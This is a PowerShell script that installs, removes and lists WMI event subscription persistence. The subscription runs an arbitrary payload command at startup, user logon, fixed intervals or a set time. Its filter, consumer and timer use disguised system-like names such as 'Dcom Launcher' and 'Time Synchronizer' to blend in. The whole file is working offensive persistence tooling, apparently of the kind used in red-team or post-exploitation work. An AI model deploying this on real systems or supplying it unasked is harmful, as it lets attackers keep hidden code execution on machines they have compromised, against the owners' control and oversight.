$EventFilterName = 'Dcom Launcher'
$EventConsumerName = 'Dcom Launcher'
$TimerId = 'Time Synchronizer'

function Install-Persistence{
<#
.EXAMPLE
Install-Persistence -Trigger Startup -Payload "c:\windows\notepad.exe"

.EXAMPLE
Install-Persistence -Trigger UserLogon -Payload ""

.EXAMPLE
Install-Persistence -Trigger Interval -IntervalPeriod 60 -Payload ""

.EXAMPLE
Install-Persistence -Trigger Timed -ExecutionTime '10:00:00' -Payload ""
#>
    Param (
    
        [Parameter(Mandatory = $true)]
        [ValidateSet('Startup', 'UserLogon', 'Interval', 'Timed')]
        [String]
        [ValidateNotNullOrEmpty()]
        $Trigger,
        
        [Parameter(Mandatory = $true)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Payload,

        [String]
        [ValidateNotNullOrEmpty()]
        $UserName = 'any',
        
        [Int32]
        [ValidateNotNullOrEmpty()]
        $IntervalPeriod = 3600,
        
        [Datetime]
        [ValidateNotNullOrEmpty()]
        $ExecutionTime = [datetime]'10:00:00'
    )

    Switch ($Trigger)
    {
        'Startup'
        {
            $Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
        }
    
        'UserLogon'
        {
            $Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LoggedOnUser'"
        }
        
        'Interval'
        {
            Set-WmiInstance -class '__IntervalTimerInstruction' -Arguments @{ IntervalBetweenEvents = ($IntervalPeriod * 1000); TimerId = $TimerId }
            $Query = "Select * from __TimerEvent where TimerId = '$TimerId'"
        }
        
        'Timed'
        {
            $Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = $($ExecutionTime.Hour.ToString()) AND TargetInstance.Minute = $($ExecutionTime.Minute.ToString()) GROUP WITHIN 60"
        }
        
    }
	
	
    # Create event filter
    $EventFilterArgs = @{
        EventNamespace = 'root\cimv2'
        Name = $EventFilterName
		Query = $Query
        QueryLanguage = 'WQL'
    }

    $Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs

    # Create CommandLineEventConsumer
    $CommandLineConsumerArgs = @{
        Name = $EventConsumerName
        CommandLineTemplate = $Payload
    }
    $Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs

    # Create FilterToConsumerBinding
    $FilterToConsumerArgs = @{
        Filter = $Filter
        Consumer = $Consumer
    }
    $FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs

    #Confirm the Event Filter was created
    $EventCheck = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = '$EventFilterName'"
    if ($EventCheck -ne $null) {
        Write-Host "Event Filter $EventFilterName successfully written to host"
    }

    #Confirm the Event Consumer was created
    $ConsumerCheck = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = '$EventConsumerName'"
    if ($ConsumerCheck -ne $null) {
        Write-Host "Event Consumer $EventConsumerName successfully written to host"
    }

    #Confirm the FiltertoConsumer was created
    $BindingCheck = Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding -Filter "Filter = ""__eventfilter.name='$EventFilterName'"""
    if ($BindingCheck -ne $null){
        Write-Host "Filter To Consumer Binding successfully written to host"
    }

}

function Remove-Persistence{

    $EventConsumerToRemove = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = '$EventConsumerName'"
    $EventFilterToRemove = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = '$EventFilterName'"
    $FilterConsumerBindingToRemove = Get-WmiObject -Class __FilterToConsumerbinding -Namespace root\subscription -Filter "Consumer = ""CommandLineEventConsumer.name='$EventConsumerName'"""
    $TimerIdToRemove = Get-WmiObject -Class __IntervalTimerInstruction -Filter "TimerId='$TimerId'"

    if($FilterConsumerBindingToRemove ) {$FilterConsumerBindingToRemove | Remove-WmiObject}
    if($EventConsumerToRemove) { $EventConsumerToRemove | Remove-WmiObject}
    if($EventFilterToRemove) { $EventFilterToRemove | Remove-WmiObject}
    if($TimerIdToRemove) { $TimerIdToRemove | Remove-WmiObject}
}

function Check-Persistence{
    
    Get-WmiObject -Namespace root/subscription -Class __EventFilter

    Write-Host "----------------------------------------------------------"
    Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer

    Write-Host "----------------------------------------------------------"
    Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding
	
    Write-Host "----------------------------------------------------------"
    Get-WmiObject -Class __IntervalTimerInstruction
}